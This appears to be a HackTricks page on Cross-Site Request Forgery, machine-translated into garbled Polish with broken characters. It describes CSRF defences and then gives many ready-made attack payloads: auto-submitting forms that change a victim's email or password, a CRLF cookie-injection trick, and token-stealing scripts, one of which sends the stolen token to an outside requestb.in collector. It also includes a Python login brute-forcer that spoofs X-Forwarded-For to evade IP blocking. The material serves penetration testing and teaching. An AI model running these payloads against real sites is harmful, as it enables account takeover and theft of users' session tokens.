# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) albo **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**Spojrzenie na Hacking**\
Zajmij siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci Hackingu na Å»ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnoÅ›ciom i spojrzeniom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i istotnymi aktualizacjami platform

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## WyjaÅ›nienie Cross-Site Request Forgery (CSRF)

**Cross-Site Request Forgery (CSRF)** to rodzaj podatnoÅ›ci na bezpieczeÅ„stwo wystÄ™pujÄ…cej w aplikacjach internetowych. UmoÅ¼liwia atakujÄ…cym wykonywanie dziaÅ‚aÅ„ w imieniu nieÅ›wiadomych uÅ¼ytkownikÃ³w poprzez wykorzystanie ich uwierzytelnionych sesji. Atak jest wykonywany, gdy uÅ¼ytkownik zalogowany na platformie ofiary odwiedza zÅ‚oÅ›liwÄ… witrynÄ™. NastÄ™pnie ta witryna wywoÅ‚uje Å¼Ä…dania do konta ofiary za pomocÄ… metod takich jak wykonanie JavaScript, przesÅ‚anie formularzy lub pobranie obrazÃ³w.

### Wymagania wstÄ™pne dla ataku CSRF

Aby wykorzystaÄ‡ podatnoÅ›Ä‡ CSRF, naleÅ¼y speÅ‚niÄ‡ kilka warunkÃ³w:

1. **Zidentyfikuj cennÄ… akcjÄ™**: AtakujÄ…cy musi znaleÅºÄ‡ akcjÄ™ warta wykorzystania, takÄ… jak zmiana hasÅ‚a uÅ¼ytkownika, adresu e-mail lub podniesienie uprawnieÅ„.
2. **ZarzÄ…dzanie sesjÄ…**: Sesja uÅ¼ytkownika powinna byÄ‡ zarzÄ…dzana wyÅ‚Ä…cznie za pomocÄ… plikÃ³w cookie lub nagÅ‚Ã³wka uwierzytelniania podstawowego HTTP, poniewaÅ¼ inne nagÅ‚Ã³wki nie mogÄ… byÄ‡ manipulowane w tym celu.
3. **Brak nieprzewidywalnych parametrÃ³w**: Å»Ä…danie nie powinno zawieraÄ‡ nieprzewidywalnych parametrÃ³w, poniewaÅ¼ mogÄ… one uniemoÅ¼liwiÄ‡ atak.

### Szybkie sprawdzenie

MoÅ¼esz **przechwyciÄ‡ Å¼Ä…danie w Burp** i sprawdziÄ‡ zabezpieczenia CSRF oraz przetestowaÄ‡ z przeglÄ…darki, klikajÄ…c na **Kopiuj jako fetch** i sprawdzajÄ…c Å¼Ä…danie:

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Obrona przed CSRF

MoÅ¼na wdroÅ¼yÄ‡ kilka Å›rodkÃ³w zaradczych, aby chroniÄ‡ siÄ™ przed atakami CSRF:

* [**Pliki cookie SameSite**](hacking-with-cookies/#samesite): Ta atrybut zapobiega przesyÅ‚aniu plikÃ³w cookie przez przeglÄ…darkÄ™ wraz z Å¼Ä…daniami miÄ™dzy witrynami. [WiÄ™cej o plikach cookie SameSite](hacking-with-cookies/#samesite).
* [**WspÃ³Å‚dzielenie zasobÃ³w miÄ™dzy domenami**](cors-bypass.md): Polityka CORS witryny ofiary moÅ¼e wpÅ‚ynÄ…Ä‡ na wykonalnoÅ›Ä‡ ataku, zwÅ‚aszcza jeÅ›li atak wymaga odczytu odpowiedzi z witryny ofiary. [Dowiedz siÄ™ wiÄ™cej o omijaniu CORS](cors-bypass.md).
* **Weryfikacja uÅ¼ytkownika**: Wymaganie podania hasÅ‚a uÅ¼ytkownika lub rozwiÄ…zanie captcha moÅ¼e potwierdziÄ‡ intencje uÅ¼ytkownika.
* **Sprawdzanie nagÅ‚Ã³wkÃ³w Referrer lub Origin**: Sprawdzanie tych nagÅ‚Ã³wkÃ³w moÅ¼e pomÃ³c w zapewnieniu, Å¼e Å¼Ä…dania pochodzÄ… od zaufanych ÅºrÃ³deÅ‚. Jednak staranne tworzenie adresÃ³w URL moÅ¼e obejÅ›Ä‡ Åºle zaimplementowane kontrole, takie jak:
* UÅ¼ycie `http://mal.net?orig=http://example.com` (URL koÅ„czy siÄ™ zaufanym adresem URL)
* UÅ¼ycie `http://example.com.mal.net` (URL zaczyna siÄ™ od zaufanego adresu URL)
* **Modyfikowanie nazw parametrÃ³w**: Zmiana nazw parametrÃ³w w Å¼Ä…daniach POST lub GET moÅ¼e pomÃ³c w zapobieganiu automatycznym atakom.
* **Tokeny CSRF**: WÅ‚Ä…czenie unikalnego tokenu CSRF w kaÅ¼dej sesji i wymaganie tego tokenu w kolejnych Å¼Ä…daniach moÅ¼e znaczÄ…co zmniejszyÄ‡ ryzyko CSRF. SkutecznoÅ›Ä‡ tokenu moÅ¼na zwiÄ™kszyÄ‡, wymuszajÄ…c CORS.

Zrozumienie i wdroÅ¼enie tych obron jest kluczowe dla utrzymania bezpieczeÅ„stwa i integralnoÅ›ci aplikacji internetowych.

## OminiÄ™cia obrony

### Od POST do GET

ByÄ‡ moÅ¼e formularz, ktÃ³ry chcesz wykorzystaÄ‡, jest przygotowany do wysÅ‚ania **Å¼Ä…dania POST z tokenem CSRF**, jednak naleÅ¼y **sprawdziÄ‡**, czy **GET** jest rÃ³wnieÅ¼ **waÅ¼ny** i czy podczas wysyÅ‚ania Å¼Ä…dania GET **token CSRF jest wciÄ…Å¼ weryfikowany**.

### Brak tokenu

Aplikacje mogÄ… wdroÅ¼yÄ‡ mechanizm **weryfikacji tokenÃ³w**, gdy sÄ… obecne. Jednak pojawia siÄ™ podatnoÅ›Ä‡, jeÅ›li weryfikacja jest pomijana caÅ‚kowicie, gdy token jest nieobecny. AtakujÄ…cy mogÄ… wykorzystaÄ‡ to, **usuwajÄ…c parametr**, ktÃ³ry przenosi token, a nie tylko jego wartoÅ›Ä‡. Pozwala to im ominÄ…Ä‡ proces weryfikacji i skutecznie przeprowadziÄ‡ atak typu Cross-Site Request Forgery (CSRF).

### Token CSRF nie jest powiÄ…zany z sesjÄ… uÅ¼ytkownika

Aplikacje **niepowiÄ…zujÄ…ce tokenÃ³w CSRF z sesjami uÅ¼ytkownikÃ³w** stanowiÄ… znaczne **ryzyko bezpieczeÅ„stwa**. Te systemy weryfikujÄ… tokeny w oparciu o **globalny pulÄ™**, zamiast zapewniaÄ‡, Å¼e kaÅ¼dy token jest zwiÄ…zany z sesjÄ… inicjujÄ…cÄ….

Oto jak atakujÄ…cy wykorzystujÄ… tÄ™ podatnoÅ›Ä‡:

1. **UwierzytelniajÄ… siÄ™** za pomocÄ… wÅ‚asnego konta.
2. **UzyskujÄ… waÅ¼ny token CSRF** z globalnej puli.
3. **WykorzystujÄ… ten token** w ataku CSRF przeciwko ofierze.

Ta podatnoÅ›Ä‡ pozwala atakujÄ…cym na dokonywanie nieautoryzowanych Å¼Ä…daÅ„ w imieniu ofiary, wykorzystujÄ…c **niewystarczajÄ…cy mechanizm weryfikacji tokenÃ³w aplikacji**.

### OminiÄ™cie metody

JeÅ›li Å¼Ä…danie uÅ¼ywa "**dziwnej**" **metody**, sprawdÅº, czy funkcjonalnoÅ›Ä‡ **nadpisywania metody** dziaÅ‚a. Na przykÅ‚ad, jeÅ›li **uÅ¼ywa metody PUT**, moÅ¼esz sprÃ³bowaÄ‡ **uÅ¼yÄ‡ metody POST** i **wysÅ‚aÄ‡**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

To rÃ³wnieÅ¼ moÅ¼e dziaÅ‚aÄ‡, wysyÅ‚ajÄ…c **parametr \_method wewnÄ…trz Å¼Ä…dania POST** lub uÅ¼ywajÄ…c **nagÅ‚Ã³wkÃ³w**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### OminiÄ™cie niestandardowego tokenu nagÅ‚Ã³wka

JeÅ›li Å¼Ä…danie dodaje **niestandardowy nagÅ‚Ã³wek** z **tokenem** do Å¼Ä…dania jako **metoda ochrony CSRF**, wtedy:

* Przetestuj Å¼Ä…danie bez **Niestandardowego Tokenu oraz nagÅ‚Ã³wka.**
* Przetestuj Å¼Ä…danie z dokÅ‚adnie **takÄ… samÄ… dÅ‚ugoÅ›ciÄ…, ale innym tokenem**.

### Token CSRF jest weryfikowany za pomocÄ… pliku cookie

Aplikacje mogÄ… wdroÅ¼yÄ‡ ochronÄ™ CSRF poprzez zduplikowanie tokenu zarÃ³wno w pliku cookie, jak i w parametrze Å¼Ä…dania lub poprzez ustawienie pliku cookie CSRF i weryfikacjÄ™, czy token wysÅ‚any w backendzie odpowiada wartoÅ›ci w pliku cookie. Aplikacja weryfikuje Å¼Ä…dania, sprawdzajÄ…c, czy token w parametrze Å¼Ä…dania zgadza siÄ™ z wartoÅ›ciÄ… w pliku cookie.

Jednak ta metoda jest podatna na ataki CSRF, jeÅ›li strona internetowa ma wady pozwalajÄ…ce atakujÄ…cemu na ustawienie pliku cookie CSRF w przeglÄ…darce ofiary, takie jak podatnoÅ›Ä‡ CRLF. AtakujÄ…cy mogÄ… wykorzystaÄ‡ to, Å‚adujÄ…c zwodniczy obraz, ktÃ³ry ustawia plik cookie, a nastÄ™pnie rozpoczynajÄ…c atak CSRF.

PoniÅ¼ej znajduje siÄ™ przykÅ‚ad, jak moÅ¼na zbudowaÄ‡ atak:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
ZauwaÅ¼, Å¼e jeÅ›li **token csrf jest powiÄ…zany z ciasteczkiem sesji, ten atak nie zadziaÅ‚a**, poniewaÅ¼ bÄ™dziesz musiaÅ‚ ustawiÄ‡ ofierze swojÄ… sesjÄ™, a wiÄ™c bÄ™dziesz atakowaÄ‡ siebie.
{% endhint %}

### Zmiana typu zawartoÅ›ci

Zgodnie z [**tym**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), aby **uniknÄ…Ä‡ Å¼Ä…daÅ„ wstÄ™pnych** przy uÅ¼yciu metody **POST**, dozwolone sÄ… nastÄ™pujÄ…ce wartoÅ›ci typu zawartoÅ›ci (Content-Type):

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Jednak zauwaÅ¼, Å¼e **logika serwera moÅ¼e siÄ™ rÃ³Å¼niÄ‡** w zaleÅ¼noÅ›ci od uÅ¼ytego **typu zawartoÅ›ci**, dlatego powinieneÅ› wyprÃ³bowaÄ‡ wymienione wartoÅ›ci oraz inne, takie jak **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

PrzykÅ‚ad (z [tutaj](https://brycec.me/posts/corctf\_2021\_challenges)) wysyÅ‚ania danych JSON jako text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### OminiÄ™cie Å¼Ä…daÅ„ wstÄ™pnych dla danych JSON

Podczas prÃ³by wysÅ‚ania danych JSON za pomocÄ… Å¼Ä…dania POST, uÅ¼ycie `Content-Type: application/json` w formularzu HTML nie jest bezpoÅ›rednio moÅ¼liwe. Podobnie, wykorzystanie `XMLHttpRequest` do wysÅ‚ania tego typu treÅ›ci inicjuje Å¼Ä…danie wstÄ™pne. Niemniej jednak istniejÄ… strategie, aby potencjalnie ominÄ…Ä‡ to ograniczenie i sprawdziÄ‡, czy serwer przetwarza dane JSON niezaleÅ¼nie od Content-Type:

1. **UÅ¼yj alternatywnych typÃ³w zawartoÅ›ci**: Wykorzystaj `Content-Type: text/plain` lub `Content-Type: application/x-www-form-urlencoded`, ustawiajÄ…c `enctype="text/plain"` w formularzu. Ten sposÃ³b testuje, czy serwer uÅ¼ywa danych bez wzglÄ™du na Content-Type.
2. **Zmodyfikuj typ zawartoÅ›ci**: Aby uniknÄ…Ä‡ Å¼Ä…dania wstÄ™pnego, jednoczeÅ›nie zapewniajÄ…c, Å¼e serwer rozpoznaje zawartoÅ›Ä‡ jako JSON, moÅ¼esz wysÅ‚aÄ‡ dane z `Content-Type: text/plain; application/json`. To nie powoduje Å¼Ä…dania wstÄ™pnego, ale moÅ¼e byÄ‡ poprawnie przetworzone przez serwer, jeÅ›li jest skonfigurowany do akceptowania `application/json`.
3. **Wykorzystanie pliku SWF Flash**: Mniej popularna, ale moÅ¼liwa metoda polega na uÅ¼yciu pliku SWF flash do ominiÄ™cia takich ograniczeÅ„. Aby uzyskaÄ‡ dogÅ‚Ä™bnÄ… wiedzÄ™ na temat tej techniki, zajrzyj do [tego wpisu](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### OminiÄ™cie sprawdzania Referrer / Origin

**Unikaj nagÅ‚Ã³wka Referrer**

Aplikacje mogÄ… sprawdzaÄ‡ nagÅ‚Ã³wek 'Referer' tylko wtedy, gdy jest obecny. Aby uniemoÅ¼liwiÄ‡ przeglÄ…darce wysÅ‚anie tego nagÅ‚Ã³wka, moÅ¼na uÅ¼yÄ‡ nastÄ™pujÄ…cego tagu meta HTML:
```xml
<meta name="referrer" content="never">
```
To zapewnia, Å¼e nagÅ‚Ã³wek â€Refererâ€ jest pominiÄ™ty, co potencjalnie omija kontrole walidacji w niektÃ³rych aplikacjach.

**OminiÄ™cia wyraÅ¼eÅ„ regularnych**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Aby ustawiÄ‡ nazwÄ™ domeny serwera w adresie URL, ktÃ³ry zostanie wysÅ‚any przez Referrera wewnÄ…trz parametrÃ³w, moÅ¼na uÅ¼yÄ‡:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Bypass metody HEAD**

Pierwsza czÄ™Å›Ä‡ [**tego opisu CTF**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) wyjaÅ›nia, Å¼e [kod ÅºrÃ³dÅ‚owy Oak'a](https://github.com/oakserver/oak/blob/main/router.ts#L281), router jest ustawiony do **obsÅ‚ugi Å¼Ä…daÅ„ HEAD jako Å¼Ä…daÅ„ GET** bez ciaÅ‚a odpowiedzi - powszechne obejÅ›cie, ktÃ³re nie jest unikalne dla Oak. Zamiast konkretnego obsÅ‚ugujÄ…cego Å¼Ä…dania HEAD, sÄ… one po prostu **przekazywane do obsÅ‚ugujÄ…cego GET, ale aplikacja po prostu usuwa ciaÅ‚o odpowiedzi**.

Dlatego, jeÅ›li Å¼Ä…danie GET jest ograniczone, moÅ¼na po prostu **wysÅ‚aÄ‡ Å¼Ä…danie HEAD, ktÃ³re zostanie przetworzone jako Å¼Ä…danie GET**.

## **PrzykÅ‚ady Wykorzystania**

### **Wyciekanie tokena CSRF**

JeÅ›li **token CSRF** jest uÅ¼ywany jako **obrona**, moÅ¼na sprÃ³bowaÄ‡ go **wyciec** wykorzystujÄ…c podatnoÅ›Ä‡ [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) lub podatnoÅ›Ä‡ [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET za pomocÄ… tagÃ³w HTML**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Inne tagi HTML5, ktÃ³re mogÄ… byÄ‡ uÅ¼yte do automatycznego wysÅ‚ania Å¼Ä…dania GET to:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Å»Ä…danie GET formularza
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Å»Ä…danie POST formularza
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### WysyÅ‚anie Å¼Ä…dania POST formularzem za pomocÄ… elementu iframe
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Å»Ä…danie POST Ajax**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Å¼Ä…danie POST z uÅ¼yciem multipart/form-data
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Å¼Ä…danie POST multipart/form-data v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### WysyÅ‚anie Å¼Ä…dania POST formularza z poziomu ramki (iframe)
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Ukradnij token CSRF i wyÅ›lij Å¼Ä…danie POST**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Ukradnij token CSRF i wyÅ›lij Å¼Ä…danie POST za pomocÄ… ramki iframe, formularza i Ajax**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Ukradnij token CSRF i wyÅ›lij Å¼Ä…danie POST za pomocÄ… ramki (iframe) i formularza**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Ukradnij token i wyÅ›lij go za pomocÄ… 2 ramek**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POBIERANIE TOKENA CSRF za pomocÄ… Ajaxa i wysÅ‚anie Å¼Ä…dania POST za pomocÄ… formularza**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF z Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## Atak Brute Force na Logowanie CSRF

Kod moÅ¼e byÄ‡ uÅ¼yty do przeprowadzenia ataku Brut Force na formularz logowania przy uÅ¼yciu tokena CSRF (Wykorzystuje rÃ³wnieÅ¼ nagÅ‚Ã³wek X-Forwarded-For w celu prÃ³by obejÅ›cia ewentualnego czarnego listowania adresÃ³w IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## NarzÄ™dzia <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## OdnoÅ›niki

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**Spojrzenie na Hacking**\
Zanurz siÄ™ w treÅ›ciach, ktÃ³re zgÅ‚Ä™biajÄ… emocje i wyzwania zwiÄ…zane z hakerstwem

**AktualnoÅ›ci z Hackingu na Å»ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnoÅ›ciom i wglÄ…dom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i istotnymi aktualizacjami platform

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

